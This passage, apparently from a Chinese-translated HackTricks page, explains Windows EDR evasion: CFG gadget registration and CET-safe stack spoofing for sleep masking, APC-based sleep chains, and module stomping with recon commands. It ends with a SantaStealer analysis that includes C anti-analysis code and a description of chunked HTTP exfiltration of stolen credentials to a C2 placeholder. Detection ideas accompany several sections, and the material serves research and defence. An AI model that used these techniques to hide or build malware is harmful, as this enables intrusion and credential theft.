- `advapi32!SystemFunction032` 被用于大块、连续、接近 image 尺寸的 buffers。
- 大范围 `VirtualProtect`，随后进行自定义的 per-section permission restoration。

### Runtime CFG registration for sleep-obfuscation gadgets

在启用 CFG 的目标上，首次对 mid-function gadget（例如 `jmp [rbx]` 或 `jmp rdi`）的间接跳转通常会因该 gadget 不在模块的 CFG metadata 中而使进程崩溃，并返回 `STATUS_STACK_BUFFER_OVERRUN`。为了让 Ekko/Kraken-style chain 在加固进程中继续运行：

- 使用 `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` 和 `CFG_CALL_TARGET_VALID` entries 注册 chain 使用的每个间接目标。
- 对于已加载 images（`ntdll`, `kernel32`, `advapi32`）中的地址，`MEMORY_RANGE_ENTRY` 必须从 **image base** 开始并覆盖 **full image size**。
- 对于手动映射/PIC/stomped regions，则使用 **allocation base** 和 allocation size。
- 不仅标记 dispatch gadget，还要标记间接到达的 exports（`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls）以及任何将成为间接目标的 attacker-controlled executable sections。

这会把基于 ROP/JOP 的 sleep chains 从“仅在非 CFG 进程中可用”转变为可复用原语，可用于 `explorer.exe`、browsers、`svchost.exe` 以及其他使用 `/guard:cf` 编译的终端。

### CET-safe stack spoofing for sleeping threads

完整的 `CONTEXT` replacement 很显眼，并且在 CET Shadow Stack systems 上可能失效，因为 spoofed `Rip` 仍必须与 hardware shadow stack 一致。更安全的 sleep-masking 模式是：

- 选择同一进程中的另一个线程，并通过 `NtQueryInformationThread` 读取其 `NT_TIB` / TEB stack bounds（`StackBase`, `StackLimit`）。
- 备份当前线程真实的 TEB/TIB。
- 使用 `GetThreadContext` 捕获真实的 sleeping context。
- 只将真实的 `Rip` 复制到 spoof context 中，同时保留 spoofed `Rsp`/stack state 不变。
- 在 sleep window 期间，将 spoof thread 的 `NT_TIB` 复制到当前 TEB，使 stack walkers 在一个合法的 stack range 内 unwind。
- 等待结束后，恢复原始 TIB 和 thread context。

这会保留与 CET 一致的 instruction pointer，同时误导那些信任 TEB stack metadata 来验证 unwind 的 EDR stack walkers。

### APC-based alternative: Kraken Mask

如果 timer-queue dispatch 过于有特征，可以通过一个 suspended helper thread 使用 queued APCs 执行相同的 sleep-encrypt-spoof-restore 序列：

- 创建一个以 `NtTestAlert` 为 entrypoint 的 helper thread。
- 使用 `NtQueueApcThread` 队列化准备好的 `CONTEXT` frames/APCs，并通过 `NtAlertResumeThread` 处理它们。
- 将 chain state 存在 heap 上，而不是 helper stack 上，以避免耗尽默认的 64 KB thread stack。
- 使用 `NtSignalAndWaitForSingleObject` 原子地发送开始事件并阻塞。
- 在恢复 TIB/context 之前先 suspend 主线程（`NtSuspendThread` → restore → `NtResumeThread`），以减少 scanner 捕获到半恢复 stack 的 race window。

这会把 `CreateTimerQueueTimer` + `NtContinue` 特征替换为 helper-thread/APC 特征，同时保持相同的 RC4 masking 和 stack-spoofing 目标。

Additional detection ideas
- 在 sleeps、waits 或 APC dispatch 之前不久使用 `NtSetInformationVirtualMemory` 搭配 `VmCfgCallTargetInformation`。
- 围绕 `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, 或 `ConnectNamedPipe` 包裹 `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` 之后直接写入当前线程的 TEB/TIB stack bounds。
- `NtQueueApcThread`/`NtAlertResumeThread` chains 间接到达 `SystemFunction032`, `VirtualProtect`, 或 section-permission restoration helpers。
- 在 signed modules 内部重复使用诸如 `FF 23`（`jmp [rbx]`）或 `FF E7`（`jmp rdi`）之类短 gadget signatures 作为 dispatch pivots。


## Precision Module Stomping

Module stomping 从 **已经映射到目标进程中的 DLL 的 `.text` section** 执行 payload，而不是分配明显的 private executable memory 或加载一个新的 sacrificial DLL。覆盖目标应当是一个 **已加载、disk-backed 的 image**，其 code space 可以容纳 payload，而不会破坏进程仍然需要的 code paths。

### Reliable target selection

对 `uxtheme.dll` 或 `comctl32.dll` 这类常见模块进行 naive stomping 是很脆弱的：DLL 可能根本没有加载到远程进程中，而且过小的 code region 会导致进程崩溃。更可靠的流程是：

1. 枚举目标进程模块，并维护一个仅包含名称的 include list，列出已经加载的 DLL。
2. 先构建 payload，并记录其 **精确字节大小**。
3. 扫描候选 DLL 的磁盘文件，并将 PE section 的 **`.text` `Misc_VirtualSize`** 与 payload 大小进行比较。这比 file size 更重要，因为它反映的是在内存中映射时 executable section 的大小。
4. 解析 **Export Address Table (EAT)**，并选择一个已导出的函数 RVA 作为 stomp 起始偏移。
5. 计算 **blast radius**：如果 payload 超过所选函数边界，它会覆盖其后内存布局中的相邻 exports。

常见于实战中的 recon/selection helpers：
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operational notes
- Prefer DLLs **already loaded** in the remote process to avoid the telemetry of `LoadLibrary`/unexpected image loads.
- Prefer exports that are rarely executed by the target application, otherwise normal code paths may hit the stomped bytes before or after thread creation.
- Large implants often require changing shellcode embedding from a string literal to a **byte-array/braced initializer** so the full buffer is represented correctly in the injector source.

Detection ideas
- Remote writes into **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) instead of the more common private RWX/RX allocations.
- Export entry points whose in-memory bytes no longer match the backing file on disk.
- Remote threads or context pivots that begin execution inside a legitimate DLL export whose first bytes were recently modified.
- Suspicious `VirtualProtect(Ex)` / `WriteProcessMemory` sequences against DLL `.text` pages followed by thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) 说明了现代 info-stealer 如何将 AV bypass、anti-analysis 和 credential access 融合到单一工作流中。

### Keyboard layout gating & sandbox delay

- 一个配置标志（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的 keyboard layouts。如果发现 Cyrillic layout，样本会写入一个空的 `CIS` 标记并在运行 stealers 之前终止，确保它不会在被排除的地区触发，同时保留一个 hunting artifact。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层 `check_antivm` 逻辑

- 变体 A 遍历进程列表，对每个名称使用自定义 rolling checksum 进行 hash，并将其与内置的 debugger/sandbox blocklists 比较；它还会对 computer name 重复执行 checksum，并检查如 `C:\analysis` 之类的工作目录。
- 变体 B 检查系统属性（进程数量下限、最近 uptime），调用 `OpenServiceA("VBoxGuest")` 来检测 VirtualBox additions，并在 sleep 前后进行 timing 检查以识别 single-stepping。任何命中都会在 modules 启动前中止。

### Fileless helper + double ChaCha20 reflective loading

- 主 DLL/EXE 内嵌了一个 Chromium credential helper，该 helper 要么落盘，要么在内存中手动映射；fileless 模式会自行解析 imports/relocations，因此不会写入任何 helper artifacts。
- 该 helper 存储了一个被 ChaCha20 双重加密的第二阶段 DLL（两个 32-byte keys + 12-byte nonces）。两次解密后，它会以 reflective 方式加载该 blob（不使用 `LoadLibrary`），并调用源自 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 的导出函数 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。
- ChromElevator routines 使用 direct-syscall reflective process hollowing 注入到一个正在运行的 Chromium browser 中，继承 AppBound Encryption keys，并直接从 SQLite databases 解密 passwords/cookies/credit cards，尽管有 ABE hardening 仍然有效。


### 模块化内存中收集 & 分块 HTTP exfil

- `create_memory_based_log` 遍历一个全局 `memory_generators` function-pointer table，并为每个启用的 module（Telegram、Discord、Steam、screenshots、documents、browser extensions 等）启动一个 thread。每个 thread 将结果写入共享 buffers，并在约 ~45s 的 join window 后报告其 file count。
- 完成后，所有内容会使用静态链接的 `miniz` library 打包为 `%TEMP%\\Log.zip`。随后 `ThreadPayload1` 先 sleep 15s，再通过 HTTP POST 将 archive 以 10 MB chunks 发送到 `http://<C2>:6767/upload`，并伪装 browser `multipart/form-data` boundary（`----WebKitFormBoundary***`）。每个 chunk 会添加 `User-Agent: upload`、`auth: <build_id>`、可选的 `w: <campaign_tag>`，最后一个 chunk 还会附加 `complete: true`，以便 C2 知道重组已完成。

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
